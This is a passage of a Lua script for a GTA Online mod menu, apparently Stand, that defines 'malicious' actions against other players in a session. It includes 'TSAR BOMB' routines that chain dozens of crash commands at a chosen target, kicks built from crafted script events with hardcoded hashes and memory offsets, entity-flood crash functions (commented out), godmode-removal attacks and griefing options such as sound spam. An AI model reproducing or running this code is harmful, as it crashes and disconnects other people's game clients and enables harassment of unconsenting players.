        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("Wait on when everything is cleaned...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
	
	    menu.action(crashes, "TSAR BOMB V3", {"tsarbomba2"}, "Crash pc demander, if you do not have good pc I do not recommend using it (Unblockable uwu) (Needs regular to work well)", function()
	        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Pobre man")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv8"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv9"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv11"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv15"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv16"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("Espera en lo que se limpia todo...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)

  menu.action(crashes, "TSAR BOMB V4 'Test'", {"tsarbomba3"}, "Crash demanding pc, if you do not have good pc I do not recommend using it (Unblockable uwu) n (Needs Regular to Work Well / Possible Overload)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Pobre man")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(1000)
        menu.trigger_commands("rlag"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv8"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv9"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv11"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv15"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv16"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv17"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv18"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv19"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv20"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv21"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv22"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv23"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv24"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv25"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv27"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv26"..players.get_name(player_id))
        util.yield(3000)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("Espera en lo que se limpia todo...")
        util.yield(1000)
        util.toast("Estamos recuperando tu menu...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rlag"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
	
    -- Structure premade for the next crash
    --menu.action(crashes, "Test", {}, "", function()
       --BlockSyncs(player_id, function()	
	   
	-------------------------------------------------------------------------------------------------------------------------------------------------------
	--------------------------------------------------------------------------------------------------------------------------------------------
	
--[[		function ObjectCrash(pid)
    for i = 1, 10 do
        local cord = getEntityCoords(getPlayerPed(pid))
        requestModel(3613262246)
        wait(1)
        requestModel(-835359795)
        wait(1)
        requestModel(0x96517C47)
        wait(1)
		requestModel(1115401665)
        wait(1)
        while not hasModelLoaded(-835359795) do wait() end
        while not hasModelLoaded(3613262246) do wait() end
        while not hasModelLoaded(0x96517C47) do wait() end
        local a1 = entities.create_object(-835359795, cord)
        wait(1)
        local a2 = entities.create_object(3613262246, cord)
        wait(1)
        local b1 = entities.create_object(0x96517C47, cord)
        wait(1)
        local b2 = entities.create_object(3613262246, cord)
        wait(1)
		local c2 = entities.create_object(1115401665, cord)
        wait(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
		entities.delete_by_handle(c2)
		noNeedModel(1115401665)
        wait(1)
        noNeedModel(0x96517C47)
        wait(1)
        noNeedModel(3613262246)
        wait(1)
        noNeedModel(-835359795)
        wait(1)
        end
        if SE_Notifications then
            util.toast("Finished.")
        end
end

function VehicleNetCrash(pid)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,-2130482718,368211810, 534258863,0xB328B188,-1924433270,3228633070,1956216962,1641462412,734217681,1783355638,777714999,1030400667,-1006919392,444583674,1886712733,782665360,-1435527158,-692292317,-2118308144,-613725916,-307958377,-150975354,368211810,447548909,1058115860,1981688531,	-827162039,1044954915,1394036463,-1779120616,-1693015116,-1988428699,868868440,408970549,1938952078,1802742206}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(1000)
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end

function BadOutfit(pid)
RqModel(0xE71D5E68)
RqModel(0x90EF5134)
RqModel(0x9C9EFFD8)
RqModel(0x705E61F2)
    local pc = getEntityCoords(getPlayerPed(pid))
	local ped2 = PED.CREATE_PED(26, 0x9C9EFFD8, pc.x, pc.y, pc.z, 0, true, false)
    local ped1 = PED.CREATE_PED(25, 0x705E61F2, pc.x, pc.y, pc.z, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped1)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 0, 45, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 1, 197, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 2, 76, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 3, 196, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 4, 144, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 5, 99, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 6, 102, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 7, 151, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 8, 189, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 9, 56, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 10, 132, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped1, 11, 393, 0, 0)
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped2)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 0, 66, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 1, 177, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 2, 89, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 3, 205, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 4, 54, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 6, 150, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 7, 100, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 8, 143, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 9, 33, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 10, 342, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped2, 11, 212, 0, 0)
    wait(2000)
    entities.delete_by_handle(ped1)
	entities.delete_by_handle(ped2)
end
function fishpan(pid)
Ptools_PanTable = {}
Ptools_PanCount = 300
Ptools_FishPan = 300
local targetped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)
local hash = joaat("tug")
        requestModel(hash)
        while not hasModelLoaded(hash) do wait() end
        for i = 1, Ptools_FishPan do
        Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
        local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
        NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
        ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
	end
end --]]

--menu.action(crashes, "Corrupted Components", {"corruptedcomponents"}, "blocked by popular menus", function()
--	for i = 0 ,1 do
--	VehicleNetCrash(pid)
--	ObjectCrash(pid)
--	BadOutfit(pid)
--	fishpan(pid)
--	end

--end)

-------------------------------------------------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------------------------------------------------
	
    local kicks = menu.list(malicious, "Kicks", {}, "")

    menu.action(kicks, "Freemode Death", {}, "Send them straight nonstop to story mode", function()
        util.trigger_script_event(1 << player_id, {111242367, player_id, memory.script_global(2689235 + 1 + (player_id * 453) + 318 + 7)})
    end)

    menu.action(kicks, "Connection Error", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
    end)

    menu.action(kicks, "Invalid Collectible", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)

    if menu.get_edition() >= 2 then 
        menu.action(kicks, "Adaptive Kicking", {}, "", function()
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
            menu.trigger_commands("breakup" .. players.get_name(player_id))
        end)
    else
        menu.action(kicks, "Adaptive Kicking V2", {}, "", function()
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
        end)
    end
	
	   menu.action(kicks, "Desync Kick 'Test'", {}, "", function()
        util.request_model(0x705E61F2)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local ped_ = entities.create_ped(1, 0x705E61F2, pos, 0, true, false)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 0, 0, 0, 39, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 1, 104, 25, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 2, 49, 0, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 3, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 4, 84, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 5, 82, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 6, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 7, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 8, 97, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 9, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 10, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 11, 186, 0, 0)
        util.trigger_script_event(-227800145 << player_id, {player_id, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
    end)
	
    menu.action(kicks, "Stand Non Host Kick 'Test'", {}, "", function()
                util.trigger_script_event(-371781708 << player_id, {player_id, player_id, player_id, 1403904671})
                util.trigger_script_event(-317318371 << player_id, {player_id, player_id, player_id, 1993236673})
                util.trigger_script_event(911179316 << player_id, {player_id, player_id, player_id, player_id, 1234567990, player_id, player_id})
                util.trigger_script_event(846342319 << player_id, {player_id, 578162304, 1})
                util.trigger_script_event(-2085853000 << player_id, {player_id, player_id, 1610781286, player_id, player_id})
                util.trigger_script_event(-1991317864 << player_id, {player_id, 3, 935764694, player_id, player_id})
                util.trigger_script_event(-1970125962 << player_id, {player_id, player_id, 1171952288})
                util.trigger_script_event(-1013679841 << player_id, {player_id, player_id, 2135167326, player_id})
                util.trigger_script_event(-1767058336 << player_id, {player_id, 1459620687})
                util.trigger_script_event(-1892343528 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
                util.trigger_script_event(1494472464 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
                util.trigger_script_event(69874647 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
                util.trigger_script_event(998716537 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
                util.trigger_script_event(522189882 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
                util.trigger_script_event(1514515570 << player_id, {player_id, player_id, 2147483647})
                util.trigger_script_event(296518236 << player_id, {player_id, player_id, player_id, player_id, 1})
                util.trigger_script_event(-1782442696 << player_id, {player_id, 420, 69})
                for i = 1, 5 do
                        util.trigger_script_event(-1782442696 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
        
                end
                util.trigger_script_event(924535804 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
                util.trigger_script_event(436475575 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
    end)
	
	local sekicks = menu.list(kicks, "Script Kicks", {}, "")

    menu.action(sekicks, "Script kick v1", {}, "", function()
        util.trigger_script_event(1 << player_id, {111242367, player_id, -210634234})
    end)
    
    menu.action(sekicks, "Script kick v2", {}, "", function()
        util.trigger_script_event(1 << player_id, {421832664, player_id, 0, 1951261, 829})
    end)

    menu.action(sekicks, "Script kick v3", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)
    
    menu.action(sekicks, "Script kick v4", {}, "", function()
        util.trigger_script_event(1 << player_id, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
    end)
    
    menu.action(sekicks, "Script kick v5", {}, "", function()
        util.trigger_script_event(1 << player_id, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
    end)

    local antimodder = menu.list(malicious, "Anti-Modder", {}, "")
    local kill_godmode = menu.list(antimodder, "Kill Godmode", {}, "")
    menu.action(kill_godmode, "Stun", {""}, "Blocked by most", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "Crush", {}, "", {"Khanjali", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        request_model(vehicle)

        pluto_switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)

    player_toggle_loop(antimodder, player_id, "Remove Godmode", {}, "It is blocked by many", function()
        util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    --player_toggle_loop(antimodder, player_id, "Vehicle Anti-Godmode", {}, "", function()
    --    for _, player_id in ipairs (players.list(true, true, true)) do
    --        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --        if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(player_id) then
    --            util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    --        end
    --    end
    --end)

    --player_toggle_loop(antimodder, player_id, "Remove Vehicle Godmode", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
    --        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --        ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
    --    end
    --end)

    --menu.action(antimodder, "Remove Vehicle Godmode V2", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " Not in a car")
    --    end
    --end)

    --menu.toggle_loop(antimodder, "Remove Vehicle Godmode V3", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " Not in a car")
    --    end
    --end)

    menu.action(trolling, "Send to Boat", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(player_id))
        menu.trigger_commands("summon " .. players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos)
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}
    
    menu.action(trolling, "Clone", {}, "Clone the player into a ped", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end)

    menu.action(trolling, "Clone Into Weapon", {}, "Clone the player into a weapon", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawn clone
        PED.CLONE_PED_TO_TARGET(p, aclone)
        GiveWeapon(aclone)
        setAttribute(aclone)
        TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
        if (isImmortal == true) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
        end
    end)

   -- menu.action(trolling, "Chop 'Test'", {}, "Take out a chop", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    local c = ENTITY.GET_ENTITY_COORDS(p)
   --     STREAMING.REQUEST_MODEL(chop)
    --    while not STREAMING.HAS_MODEL_LOADED(chop) do
    --        STREAMING.REQUEST_MODEL(chop)
    --        util.yield()
    --    end
   --    local achop = entities.create_ped(26, chop, c, 0) --spawn chop
   --     TASK.TASK_COMBAT_PED(achop , p, 0, 16)
   --     setAttribute(achop)
    --    if (isImmortal == true) then
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
    --    end
	-- if not STREAMING.HAS_MODEL_LOADED(chop) then
    --        util.toast("Unable to load model")
     --   end
  --  end)

    player_toggle_loop(trolling, player_id, "Sound spam", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, math.random(1, 0x6)})
        util.yield()
    end)

    menu.action(trolling, "Teleport to the backrooms", {}, "Les teletransporta a los backrooms", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
